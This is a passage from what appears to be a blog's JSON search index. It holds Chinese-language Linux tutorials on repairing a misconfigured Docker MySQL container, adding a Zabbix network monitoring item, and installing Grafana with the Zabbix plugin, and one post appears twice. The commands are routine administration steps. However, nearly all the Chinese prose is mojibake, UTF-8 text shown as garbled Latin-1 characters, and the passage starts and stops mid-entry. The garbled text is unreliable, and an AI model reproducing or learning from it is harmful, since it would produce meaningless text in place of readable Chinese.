Encryptå…è´¹SSLè¯ä¹¦è·å–ä»¥åŠè‡ªåŠ¨ç»­ç­¾","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"}]},{"title":"å½“ Docker å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨æ—¶å¦‚ä½•ä¿®æ”¹é…ç½®æ–‡ä»¶","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1","date":"2020-09-10T13:12:13.000Z","updated":"2020-09-10T13:13:32.922Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","excerpt":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ é—®é¢˜æè¿°ï¼šå› ä¸ºé”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´å®¹å™¨è¿è¡Œå¼‚å¸¸ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šå¸¸æƒ…å†µä¸‹åªæœ‰è¿›å…¥å®¹å™¨æ‰èƒ½ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸èƒ½è¿›å…¥å®¹å™¨çš„æƒ…å†µä¸‹è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ","text":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ é—®é¢˜æè¿°ï¼šå› ä¸ºé”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´å®¹å™¨è¿è¡Œå¼‚å¸¸ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šå¸¸æƒ…å†µä¸‹åªæœ‰è¿›å…¥å®¹å™¨æ‰èƒ½ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸èƒ½è¿›å…¥å®¹å™¨çš„æƒ…å†µä¸‹è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸¤ç§æ–¹å¼å»ä¿®æ”¹ï¼š2. Docker å®¹å™¨çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨ /var/lib/docker/overlay/ç›®å½•ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°è¯¥ç›®å½•ä¸‹å¯¹åº”çš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚2. æŠŠå®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°ä¸»æœºä¸­ï¼Œä¿®æ”¹å®Œä¹‹åï¼Œå†ç§»åŠ¨åˆ°å®¹å™¨ä¸­ã€‚ æ–¹å¼ä¸€ æŸ¥è¯¢æ—¥å¿— 123456docker logs &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting ç”±äºå¼‚å¸¸æ—¥å¿—å¯ä»¥å¾—çŸ¥æ˜¯å› ä¸ºæˆ‘å°†relay-log å†™æˆäº† realy å¯¼è‡´å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚ æŸ¥æ‰¾æ–‡ä»¶ 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf è¿™é‡Œå¯èƒ½ä¼šå‡ºç°å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºæ¯ä¸€æ¬¡é‡å¯Mysql å®¹å™¨éƒ½ä¼šä¿ç•™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥ç†è®ºä¸Šï¼Œç›´æ¥ä¿®æ”¹ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå°±æ˜¯å½“å‰Mysql æ‰€ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶ é‡å¯å®¹å™¨å³å¯ã€‚ æ–¹å¼äºŒå¦‚æœç¬¬ä¸€ç§æ–¹å¼æ²¡ç”Ÿæ•ˆï¼Œé‚£å¯ä»¥å°è¯•ç¬¬äºŒç§æ–¹å¼ã€‚ å¤åˆ¶å®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶åˆ°ä¸»æœºï¼š 123# è¯­æ³•ï¼šdocker cp &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt; &lt;éœ€è¦å¤åˆ¶åˆ°ä¸»æœºçš„è·¯å¾„&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf ä¿®æ”¹ä¸»æœºä¸­çš„é…ç½®æ–‡ä»¶ å°†è¯¥é…ç½®æ–‡ä»¶mv åˆ°å®¹å™¨ä¸­ï¼š 123# è¯­æ³•ï¼šdocker cp &lt;é…ç½®æ–‡ä»¶åœ¨ä¸»æœºä¸­çš„è·¯å¾„&gt; &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;:&lt;é…ç½®æ–‡ä»¶åœ¨å®¹å™¨ä¸­çš„è·¯å¾„&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf é‡å¯é…ç½®æ–‡ä»¶å³å¯ã€‚ æ€»ç»“ï¼šä¸¤ç§æ–¹å¼å‡å¯ä»¥æœ‰æ•ˆè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå½“ç„¶è¿™ç±»æ–¹å¼ä»…é€‚ç”¨äºå®¹å™¨æ˜¯å› é”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µã€‚ å‚è€ƒé“¾æ¥ Dockerä¿®æ”¹æ— æ³•å¯åŠ¨çš„å®¹å™¨çš„é…ç½®æ–‡ä»¶","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"Zabbix å¿«é€Ÿä¸Šæ‰‹â€”â€”æ·»åŠ ç›‘æ§é¡¹","slug":"zabbix-quick-start-add-monitoring-items","date":"2020-09-09T13:50:15.000Z","updated":"2020-09-09T13:51:50.880Z","comments":true,"path":"zabbix-quick-start-add-monitoring-items/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/","excerpt":"åœ¨Zabbix é»˜è®¤çš„ç›‘æ§é¡¹ä¸­ï¼Œå”¯ç‹¬æ²¡æœ‰ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ï¼Œè€Œç½‘ç»œçŠ¶å†µçš„ç›‘æ§åˆæ˜¯æˆ‘æœ€å…³å¿ƒçš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨æ·»åŠ ã€‚ ä¸‹é¢ä»‹ç»çš„æ–¹å¼ä»…é€‚åˆä¸»æœºæ•°é‡ä¸å¤šçš„æƒ…å†µæ‰‹åŠ¨æ·»åŠ ï¼Œå¦‚æœä¸»æœºæ•°é‡å¾ˆå¤šï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ä¼šå¾ˆç¹çä½æ•ˆã€‚","text":"åœ¨Zabbix é»˜è®¤çš„ç›‘æ§é¡¹ä¸­ï¼Œå”¯ç‹¬æ²¡æœ‰ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ï¼Œè€Œç½‘ç»œçŠ¶å†µçš„ç›‘æ§åˆæ˜¯æˆ‘æœ€å…³å¿ƒçš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨æ·»åŠ ã€‚ ä¸‹é¢ä»‹ç»çš„æ–¹å¼ä»…é€‚åˆä¸»æœºæ•°é‡ä¸å¤šçš„æƒ…å†µæ‰‹åŠ¨æ·»åŠ ï¼Œå¦‚æœä¸»æœºæ•°é‡å¾ˆå¤šï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ä¼šå¾ˆç¹çä½æ•ˆã€‚ è‡³äºæ›´å¥½çš„æ–¹å¼æ˜¯æ€æ ·çš„ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰å‘ç°ã€‚ æ·»åŠ ç›‘æ§é¡¹æ‰“å¼€Configuration-&gt;Hosts ä¸»æœºé¡µé¢ï¼Œç‚¹å‡»éœ€è¦ç›‘æ§é¡¹çš„ä¸»æœºçš„ Applicationã€‚ åœ¨Applicationåˆ—è¡¨ä¸­ï¼Œå¦‚æœæ²¡æœ‰çœ‹åˆ° Network interfacesè¿™ä¸€é¡¹ï¼Œé‚£ä¹ˆå¯ä»¥ç‚¹å‡»å³ä¸Šè§’çš„Create Applictionè‡ªå·±åˆ›å»ºã€‚ åˆ›å»ºå®Œæˆä¹‹åï¼Œitems é»˜è®¤æ˜¯æ²¡æœ‰çš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ·»åŠ ï¼Œç»§ç»­ç‚¹å‡»items-&gt;create itemsã€‚ æ¥ä¸‹æ¥æ˜¯æœ€é‡è¦çš„ä¸€æ­¥ï¼Œæ·»åŠ ç›‘æ§é¡¹çš„å…·ä½“ä¿¡æ¯ã€‚ éœ€è¦æ³¨æ„çš„åœ°æ–¹æœ‰ä¸‹é¢å‡ ä¸ªï¼š Nameï¼šè‡ªå®šä¹‰è¯¥é¡¹ç›‘æ§çš„åç§° Keyï¼šnet.if.in[eth0,bytes]ï¼Œå…¶ä¸­eth0å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè¿™ä¸ªå…·ä½“çš„å€¼æ˜¯è¢«ç›‘æ§å¾—ä¸»æœºå¾—å®é™…ç½‘å¡ã€‚ Unitsï¼šbps Update intervalï¼šè‡ªåŠ¨æ›´æ–°æ—¶é—´ï¼Œè¿™ä¸ªå¯ä»¥è‡ªå®šä¹‰ã€‚ Applicationsï¼šé€‰æ‹© Network interfaces å¦‚ä½•ç¡®å®šç½‘å¡åœ°å€ï¼Ÿ è¿›å…¥æœåŠ¡å™¨ï¼Œè¾“å…¥ifconfigå‘½ä»¤æŸ¥çœ‹ï¼Œé€šå¸¸æ’åœ¨æœ€å‰é¢å¾—å°±æ˜¯å®é™…ç½‘å¡ã€‚ å®Œæˆä¹‹åï¼Œç‚¹å‡»Addæ·»åŠ ç›‘æ§é¡¹ã€‚ å¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œå¯ä»¥åœ¨åˆšæ‰æ·»åŠ çš„ç›‘æ§é¡¹åˆ—è¡¨ä¸­çœ‹åˆ°ç›‘æ§é¡¹çŠ¶æ€æ˜¯å¯ç”¨çš„ã€‚ è¿™ä¸ªæ—¶å€™å·²ç»å¯ä»¥çœ‹åˆ°è¯¥ç›‘æ§é¡¹ç›¸å…³çš„æ•°æ®äº†ï¼Œå¦‚æœå¸Œæœ›åœ¨Grafana ä¸­å±•ç¤ºï¼Œé‚£ä¹ˆåªéœ€è¦åœ¨é€‰æ‹©Applicationæ—¶ï¼Œé€‰æ‹©Network interfaceså°±å¥½äº†ã€‚ ç»“åˆGrafanaï¼Œæœ€åçš„æ•ˆæœå¤§æ¦‚æ˜¯è¿™æ ·ï¼š è¿™é‡Œåªæ˜¯ä¸¾äº†ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ¥äº†è§£Zabbix å¦‚ä½•æ‰‹åŠ¨æ·»åŠ ç›‘æ§é¡¹ï¼Œå…¶ä»–ç±»å‹çš„æ•°æ®ä¹Ÿæ˜¯é€šè¿‡ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œæ·»åŠ ã€‚ å‚è€ƒé“¾æ¥ zabbixç›‘æ§ç½‘ç»œçš„å‡ºå…¥å£æµé‡ Cannot find information for this network interface in /proc/net/dev","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Zabbix + Grafana æ‰“é€ é«˜é¢œå€¼çš„åˆ†å¸ƒå¼ç›‘æ§å¹³å°","slug":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform","date":"2020-09-08T13:08:25.000Z","updated":"2020-09-08T13:09:34.991Z","comments":true,"path":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","link":"","permalink":"https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","excerpt":"åœ¨å‰é¢äº†è§£äº†å¦‚ä½•éƒ¨ç½² Zabbixï¼Œä¼—æ‰€å‘¨çŸ¥Zabbix çš„éƒ¨ç½²å¹¶ä¸æ˜¯éš¾çš„éƒ¨åˆ†ï¼Œé…ç½®æ‰æ˜¯æœ€éš¾çš„é‚£éƒ¨åˆ†ã€‚ æ‰€ä»¥å¦‚ä½•è·å–åˆ°æƒ³è¦çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œå°†é‚£éƒ¨åˆ†æ•°æ®ä»¥æ›´ç›´è§‚çš„æ–¹å¼å±•ç°å‡ºæ¥ï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬æ›´å…³å¿ƒçš„ã€‚ Zabbix é»˜è®¤æœ‰è‡ªå·±çš„ Graphsï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨Zabbix + Grafana æ‰“é€ é«˜é¢œå€¼çš„åˆ†å¸ƒå¼ç›‘æ§å¹³å°æ‰æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚","text":"åœ¨å‰é¢äº†è§£äº†å¦‚ä½•éƒ¨ç½² Zabbixï¼Œä¼—æ‰€å‘¨çŸ¥Zabbix çš„éƒ¨ç½²å¹¶ä¸æ˜¯éš¾çš„éƒ¨åˆ†ï¼Œé…ç½®æ‰æ˜¯æœ€éš¾çš„é‚£éƒ¨åˆ†ã€‚ æ‰€ä»¥å¦‚ä½•è·å–åˆ°æƒ³è¦çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œå°†é‚£éƒ¨åˆ†æ•°æ®ä»¥æ›´ç›´è§‚çš„æ–¹å¼å±•ç°å‡ºæ¥ï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬æ›´å…³å¿ƒçš„ã€‚ Zabbix é»˜è®¤æœ‰è‡ªå·±çš„ Graphsï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨Zabbix + Grafana æ‰“é€ é«˜é¢œå€¼çš„åˆ†å¸ƒå¼ç›‘æ§å¹³å°æ‰æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚ Grafana æ˜¯ä»€ä¹ˆï¼Ÿ Grafanaæ˜¯ä¸€ä¸ªè·¨å¹³å°çš„å¼€æºåº¦é‡åˆ†æå’Œå¯æ˜¯åŒ–çš„å·¥å…·ï¼Œå¯ä»¥é€šè¿‡è¯¥å°†é‡‡é›†çš„æ•°æ®æŸ¥è¯¢ç„¶åå¯è§†åŒ–çš„å±•ç¤ºï¼Œå¹¶åŠæ—¶é€šçŸ¥ã€‚ Grafana æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å±•ç¤ºæ–¹å¼ï¼šå¿«é€Ÿçµæ´»çš„å®¢æˆ·ç«¯å›¾è¡¨ï¼Œé¢æ¿æ’ä»¶æœ‰è®¸å¤šä¸åŒæ–¹å¼çš„å¯è§†åŒ–æŒ‡æ ‡å’Œæ—¥å¿—ï¼Œå®˜æ–¹åº“ä¸­å…·æœ‰ä¸°å¯Œçš„ä»ªè¡¨ç›˜æ’ä»¶ï¼Œæ¯”å¦‚çƒ­å›¾ã€æŠ˜çº¿å›¾ã€å›¾è¡¨ç­‰å¤šç§å±•ç¤ºæ–¹å¼. æ•°æ®æºï¼šGraphiteã€InfluxDBã€OpenTSDBã€Prometheusã€Elasticsearchã€CloudWatchå’ŒKairosDbã€Zabbixç­‰ã€‚ é€šçŸ¥æé†’ï¼šä»¥å¯è§†æ–¹å¼å®šä¹‰æœ€é‡è¦æŒ‡æ ‡çš„æŠ¥è­¦è§„åˆ™ï¼ŒGrafanaå°†ä¸æ–­è®¡ç®—å¹¶å‘é€é€šçŸ¥ï¼Œåœ¨æ•°æ®è¾¾åˆ°é¢„è®¾é˜ˆå€¼æ—¶é€šè¿‡slackï¼ŒPagerDutyç­‰å¤„ç†é€šçŸ¥ã€‚ æ··åˆå±•ç¤ºï¼šåœ¨åŒä¸€å›¾è¡¨ä¸­æ··åˆä½¿ç”¨ä¸åŒçš„æ•°æ®æºï¼Œå¯ä»¥åŸºäºæ¯ä¸ªæŸ¥è¯¢æŒ‡å®šæ•°æ®æºï¼Œç”šè‡³è‡ªå®šä¹‰æ•°æ®æºã€‚ æ³¨é‡Šï¼šä½¿ç”¨æ¥è‡ªä¸åŒæ•°æ®æºçš„ä¸°å¯Œäº‹ä»¶æ¥å±•ç¤ºå›¾è¡¨ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨äº‹ä»¶ä¸Šä¼šæ˜¾ç¤ºå®Œæ•´çš„äº‹ä»¶å…ƒæ•°æ®å’Œæ ‡è®°ã€‚ è¿‡æ»¤å™¨ï¼šAd-hocè¿‡æ»¤å™¨å…è®¸åŠ¨æ€åˆ›å»ºæ–°çš„é”®/å€¼è¿‡æ»¤å™¨ï¼Œè¿™äº›è¿‡æ»¤å™¨ä¼šè‡ªåŠ¨åº”ç”¨äºä½¿ç”¨è¯¥æ•°æ®æºçš„æ‰€æœ‰æŸ¥è¯¢ã€‚ å®‰è£…Grafana çš„å®‰è£…è¿˜æ˜¯å»ºè®®æ ¹æ®è‡ªå·±å®é™…çš„ç³»ç»Ÿç¯å¢ƒå»å®˜ç½‘é€‰æ‹©é€‚åˆè‡ªå·±çš„ä¸‹è½½é“¾æ¥ã€‚ æ¯”å¦‚æˆ‘çš„ç¯å¢ƒæ˜¯ Ubuntu 18.04ï¼Œæˆ‘æƒ³å®‰è£… Grafana 7.0ï¼Œæ‰€ä»¥æˆ‘çš„å®‰è£…æ–¹å¼åº”è¯¥æ˜¯ï¼š 123$ sudo apt-get install -y adduser libfontconfig1$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb$ sudo dpkg -i grafana_7.0.0_amd64.deb å¯åŠ¨æœåŠ¡ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨ grafana-serverï¼š 12$ sudo systemctl daemon-reload$ sudo systemctl start grafana-server è®¾ç½®å¼€æœºå¯åŠ¨ï¼š 1$ sudo systemctl enable grafana-server.service æŸ¥çœ‹ grafana-serveræ‰€ç›‘å¬çš„ç«¯å£ï¼š 12$ sudo netstat -lntptcp6 0 0 :::3000 :::* LISTEN 17194&#x2F;grafana-serve 3000 æ˜¯Grafana é»˜è®¤ç›‘å¬ç«¯å£ï¼Œç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—® http://your_ip_address:3000 å³å¯ã€‚ æ­£å¸¸åº”è¯¥å¯ä»¥çœ‹åˆ°è¯¥é¡µé¢ï¼Œå¦‚æœä½ èƒ½çœ‹åˆ°3000 ç«¯å£è¢«ç›‘å¬ï¼Œä½†æ˜¯é¡µé¢ä¸€ç›´æ‰“ä¸å¼€ï¼Œé‚£å¯èƒ½æ˜¯å› ä¸ºé˜²ç«å¢™æ²¡æœ‰å…è®¸3000 ç«¯å£ã€‚ é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯ï¼šadminï¼Œç™»å½•ä¹‹åè®°å¾—ç¬¬ä¸€æ—¶é—´ä¿®æ”¹é»˜è®¤å¯†ç ã€‚ å®‰è£…Zabbix æ’ä»¶æ‰“å¼€Grafana çš„æ’ä»¶åˆ—è¡¨ï¼Œæ‰¾åˆ°Zabbixã€‚ è¿™é‡Œæ ¹æ®å®å®é™…æƒ…å†µï¼Œé€‰æ‹©å¯¹åº”çš„ç‰ˆæœ¬ã€‚ é€šè¿‡grafana-cli å®‰è£…zabbix æ’ä»¶ï¼Œå°†ä¸‹é¢è¿™è¡Œä»£ç æ”¾åœ¨å®‰è£…äº† Grafana çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š 12$ grafana-cli plugins install alexanderzobnin-zabbix-appâœ” Installed alexanderzobnin-zabbix-app successfully å®‰è£…å®Œæˆä¹‹åï¼Œé‡å¯Grafanaï¼š 1$ sudo systemctl restart grafana-server ç„¶åæ‰“å¼€Grafana çš„Web ç•Œé¢ï¼Œåœ¨æ’ä»¶åˆ—è¡¨ä¸­æ‰¾åˆ° Zabbixã€‚ ç‚¹å‡»å¯ç”¨ã€‚ add data sourceè‡ªä» Grafana 7.0 ä»¥åï¼Œæ²¡æœ‰ç­¾åçš„æ’ä»¶é»˜è®¤åœ¨ datasource ä¸­æ˜¯ä¸å¯è§çš„â€¦ å‘å•Šï¼Œæœ€åˆæˆ‘å®‰è£…çš„æ˜¯ Zabbix5.0ï¼Œç„¶åçœ‹è§Grafana 7.0 å¥½åƒåªé€‚é…4.0ï¼Œå¿ƒæƒ³å®Œäº†ï¼Œè¯¥ä¸ä¼šå‡ºç°ä»€ä¹ˆç‰ˆæœ¬ä¸å…¼å®¹çš„é—®é¢˜å§ï¼Ÿ ç»“æœåœ¨add data sourceè¿™ä¸€æ­¥ï¼Œä¸€ç›´æ‰¾ä¸åˆ° zabbixâ€¦ ç„¶åä»Šå¤©æŠŠ5.0 å®Œå…¨å¸è½½äº†ï¼Œé‡æ–°è£…å›äº†4.0ï¼Œç»“æœåˆ°äº†add data sourceè¿™ä¸€æ­¥æ‰å‘ç°ï¼Œè¿˜æ˜¯æ‰¾ä¸åˆ°zabbixï¼Œå½“æ—¶å¿ƒæ€å°±å´©äº†â€¦ ç›´åˆ°æˆ‘çœ‹è§è¿™ç¯‡æ–‡ç« ï¼Œè¿™ä¹ˆé‡è¦çš„ä¿¡æ¯ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­å±…ç„¶æ²¡è®°å½•ã€‚ å¦‚æœä½ æ— æ³•è®¿é—®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹ï¼š 1234# vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini# æ·»åŠ ä¸€è¡Œallow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource ç„¶åé‡å¯Grafanaï¼š 1$ sudo systemctl restart grafana-server å†æ¬¡æ‰“å¼€Web é¡µé¢ï¼Œç°åœ¨å°±èƒ½æ‰¾åˆ° Zabbix äº†ã€‚ é…ç½® data sourceåªç”¨ä¿®æ”¹ä»¥ä¸‹å››ä¸ªåœ°æ–¹å°±å¥½äº†ï¼Œç„¶åç‚¹å‡»ä¿å­˜ã€‚ add dashboardä¾æ¬¡ç‚¹å‡»add dashboard-&gt; add new panelï¼Œç„¶åæŒ‰ç…§ä»¥ä¸‹æ–¹å¼é…ç½®ï¼Œå°±å¯ä»¥é€‰æ‹©å±•ç¤ºè‡ªå·±æƒ³è¦çš„æ•°æ®äº†ã€‚ æœ€åçš„æ•ˆæœï¼š è¿™é‡Œåªæ˜¯ä»‹ç»äº† Zabbix + Grafana æœ€åŸºç¡€çš„ç”¨æ³•ï¼Œèƒ½çœ‹åˆ°çš„æ•°æ®ä¹Ÿæ˜¯æœ€ç®€å•çš„ä¸€äº›ï¼Œå¦‚æœæƒ³çœ‹åˆ°æ›´å¤šçš„æ•°æ®ï¼Œé‚£å°±å¾—æ›´åŠ äº†è§£ Zabbix äº†ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"å½“ Docker å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨æ—¶å¦‚ä½•ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Ÿ","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally","date":"2020-09-07T00:13:24.000Z","updated":"2020-09-07T00:14:53.536Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","excerpt":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ","text":"åœ¨å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹å…¶é…ç½®æ–‡ä»¶ï¼Ÿ é—®é¢˜æè¿°ï¼šå› ä¸ºé”™è¯¯çš„é…ç½®æ–‡ä»¶å¯¼è‡´å®¹å™¨è¿è¡Œå¼‚å¸¸ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œé€šå¸¸æƒ…å†µä¸‹åªæœ‰è¿›å…¥å®¹å™¨æ‰èƒ½ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸èƒ½è¿›å…¥å®¹å™¨çš„æƒ…å†µä¸‹è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸¤ç§æ–¹å¼å»ä¿®æ”¹ï¼š2. Docker å®¹å™¨çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨ /var/lib/docker/overlay/ç›®å½•ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°è¯¥ç›®å½•ä¸‹å¯¹åº”çš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚2. æŠŠå®¹å™¨ä¸­çš„é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°ä¸»æœºä¸­ï¼Œä¿®æ”¹å®Œä¹‹åï¼Œå†ç§»åŠ¨åˆ°å®¹å™¨ä¸­ã€‚ æ–¹å¼ä¸€ æŸ¥è¯¢æ—¥å¿— 123456docker logs &lt;å®¹å™¨åç§°&#x2F;å®¹å™¨id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting ç”±äºå¼‚å¸¸æ—¥å¿—å¯ä»¥å¾—çŸ¥æ˜¯å› ä¸ºæˆ‘å°†relay-log å†™æˆäº† realy å¯¼è‡´å®¹å™¨æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚ æŸ¥æ‰¾æ–‡ä»¶ 123456$ find &#x2F; -name 